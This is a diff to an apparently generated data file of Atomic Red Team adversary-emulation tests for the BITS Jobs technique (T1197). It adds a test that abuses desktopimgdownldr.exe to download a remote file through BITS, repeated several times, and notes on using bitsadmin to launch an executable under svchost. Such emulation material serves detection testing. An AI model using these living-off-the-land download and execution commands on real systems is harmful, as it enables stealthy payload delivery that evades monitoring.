@@ -69,6 +69,14 @@ bitsadmin.exe /resume #{bits_job_name}
 timeout 5
 bitsadmin.exe /complete #{bits_job_name}
 
+set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
+
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
+
+set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
+
+set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
+
 bitsadmin.exe
 ```
 
@@ -130,6 +138,24 @@ bitsadmin.exe
              'bitsadmin.exe /resume #{bits_job_name}\n'
              'timeout 5\n'
              'bitsadmin.exe /complete #{bits_job_name}\n',
+  'name': None,
+  'source': 'atomics/T1197/T1197.yaml'},
+ {'command': 'set "#{download_path}" && cmd /c desktopimgdownldr.exe '
+             '/lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md '
+             '/eventName:desktopimgdownldr\n',
+  'name': None,
+  'source': 'atomics/T1197/T1197.yaml'},
+ {'command': 'set "SYSTEMROOT=C:\\Windows\\Temp" && cmd /c '
+             'desktopimgdownldr.exe /lockscreenurl:#{remote_file} '
+             '/eventName:desktopimgdownldr\n',
+  'name': None,
+  'source': 'atomics/T1197/T1197.yaml'},
+ {'command': 'set "#{download_path}" && cmd /c desktopimgdownldr.exe '
+             '/lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n',
+  'name': None,
+  'source': 'atomics/T1197/T1197.yaml'},
+ {'command': 'set "#{download_path}" && cmd /c desktopimgdownldr.exe '
+             '/lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n',
   'name': None,
   'source': 'atomics/T1197/T1197.yaml'},
  {'command': 'bitsadmin.exe',
@@ -307,14 +333,74 @@ bitsadmin.exe
                                                                         'schedule '
                                                                         'a '
                                                                         'BITS '
-                                                                        'transfer\n'
-                                                                        'and '
+                                                                        'transferand '
                                                                         'execute '
                                                                         'a '
                                                                         'payload '
                                                                         'in '
                                                                         'multiple '
-                                                                        'steps. '
+                                                                        'steps.\n'
+                                                                        'Note '
+                                                                        'that '
+                                                                        'in '
+                                                                        'this '
+                                                                        'test, '
+                                                                        'the '
+                                                                        'file '
+                                                                        'executed '
+                                                                        'is '
+                                                                        'not '
+                                                                        'the '
+                                                                        'one '
+                                                                        'downloaded. '
+                                                                        'The '
+                                                                        'downloading '
+                                                                        'of a '
+                                                                        'random '
+                                                                        'file '
+                                                                        'is '
+                                                                        'simply '
+                                                                        'the '
+                                                                        'trigger '
+                                                                        'for '
+                                                                        'getting '
+                                                                        'bitsdamin '
+                                                                        'to '
+                                                                        'run '
+                                                                        'an '
+                                                                        'executable.\n'
+                                                                        'This '
+                                                                        'has '
+                                                                        'the '
+                                                                        'interesting '
+                                                                        'side '
+                                                                        'effect '
+                                                                        'of '
+                                                                        'causing '
+                                                                        'the '
+                                                                        'executable '
+                                                                        '(e.g. '
+                                                                        'notepad) '
+                                                                        'to '
+                                                                        'run '
+                                                                        'with '
+                                                                        'an '
+                                                                        'Initiating '
+                                                                        'Process '
+                                                                        'of '
+                                                                        '"svchost.exe" '
+                                                                        'and '
+                                                                        'an '
+                                                                        'Initiating '
+                                                                        'Process '
+                                                                        'Command '
+                                                                        'Line '
+                                                                        'of '
+                                                                        '"svchost.exe '
+                                                                        '-k '
+                                                                        'netsvcs '
+                                                                        '-p -s '
+                                                                        'BITS"\n'
                                                                         'This '
                                                                         'job '
                                                                         'will '
@@ -323,7 +409,11 @@ bitsadmin.exe
                                                                         'the '
                                                                         'BITS '
                                                                         'queue '
+                                                                        'until '
+                                                                        'complete '
+                                                                        'or '
                                                                         'for '
+                                                                        'up to '
                                                                         '90 '
                                                                         'days '
                                                                         'by '
@@ -388,6 +478,102 @@ bitsadmin.exe
                                                          'name': 'Persist, '
                                                                  'Download, & '
                                                                  'Execute',
+                                                         'supported_platforms': ['windows']},
+                                                        {'auto_generated_guid': 'afb5e09e-e385-4dee-9a94-6ee60979d114',
+                                                         'description': 'This '
+                                                                        'test '
+                                                                        'simulates '
+                                                                        'using '
+                                                                        'destopimgdwnldr.exe '
+                                                                        'to '
+                                                                        'download '
+                                                                        'a '
+                                                                        'malicious '
+                                                                        'file\n'
+                                                                        'instead '
+                                                                        'of a '
+                                                                        'desktop '
+                                                                        'or '
+                                                                        'lockscreen '
+                                                                        'background '
+                                                                        'img. '
+                                                                        'The '
+                                                                        'process '
+                                                                        'that '
+                                                                        'actually '
+                                                                        'makes \n'
+                                                                        'the '
+                                                                        'TCP '
+                                                                        'connection '
+                                                                        'and '
+                                                                        'creates '
+                                                                        'the '
+                                                                        'file '
+                                                                        'on '
+                                                                        'the '
+                                                                        'disk '
+                                                                        'is a '
+                                                                        'svchost '
+                                                                        'process '
+                                                                        '(“-k '
+                                                                        'netsvc '
+                                                                        '-p -s '
+                                                                        'BITS”) \n'
+                                                                        'and '
+                                                                        'not '
+                                                                        'desktopimgdownldr.exe. '
+                                                                        'See '
+                                                                        'https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n',
+                                                         'executor': {'cleanup_command': 'del '
+                                                                                         '#{cleanup_path}\\#{cleanup_file}\n',
+                                                                      'command': 'set '
+                                                                                 '"#{download_path}" '
+                                                                                 '&& '
+                                                                                 'cmd '
+                                                                                 '/c '
+                                                                                 'desktopimgdownldr.exe '
+                                                                                 '/lockscreenurl:#{remote_file} '
+                                                                                 '/eventName:desktopimgdownldr\n',
+                                                                      'name': 'command_prompt'},
+                                                         'input_arguments': {'cleanup_file': {'default': '*.md',
+                                                                                              'description': 'file '
+                                                                                                             'to '
+                                                                                                             'remove '
+                                                                                                             'as '
+                                                                                                             'part '
+                                                                                                             'of '
+                                                                                                             'cleanup_command',
+                                                                                              'type': 'string'},
+                                                                             'cleanup_path': {'default': 'C:\\Windows\\Temp\\Personalization\\LockScreenImage',
+                                                                                              'description': 'path '
+                                                                                                             'to '
+                                                                                                             'delete '
+                                                                                                             'file '
+                                                                                                             'as '
+                                                                                                             'part '
+                                                                                                             'of '
+                                                                                                             'cleanup_command',
+                                                                                              'type': 'path'},
+                                                                             'download_path': {'default': 'SYSTEMROOT=C:\\Windows\\Temp',
+                                                                                               'description': 'Local '
+                                                                                                              'file '
+                                                                                                              'path '
+                                                                                                              'to '
+                                                                                                              'save '
+                                                                                                              'downloaded '
+                                                                                                              'file',
+                                                                                               'type': 'path'},
+                                                                             'remote_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md',
+                                                                                             'description': 'Remote '
+                                                                                                            'file '
+                                                                                                            'to '
+                                                                                                            'download',
+                                                                                             'type': 'url'}},
+                                                         'name': 'Bits '
+                                                                 'download '
+                                                                 'using '
+                                                                 'destktopimgdownldr.exe '
+                                                                 '(cmd)',
                                                          'supported_platforms': ['windows']}],
                                        'attack_technique': 'T1197',
                                        'display_name': 'BITS Jobs'}},
